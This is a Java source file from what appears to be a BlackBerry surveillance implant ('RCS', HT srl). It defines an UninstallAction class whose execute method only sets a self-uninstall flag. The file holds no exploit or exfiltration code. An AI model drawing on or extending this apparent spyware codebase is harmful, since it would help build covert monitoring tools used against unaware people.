/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : UninstallAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import com.ht.rcs.blackberry.utils.Check;

public class UninstallAction extends SubAction {

    public UninstallAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);

        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");

    }

    public UninstallAction(String host) {
        super(ACTION_UNINSTALL);

    }

    public boolean execute() {

        this.wantUninstall = true;
        return false;
    }

    protected boolean parse(byte[] confParams) {

        return true;
    }

}
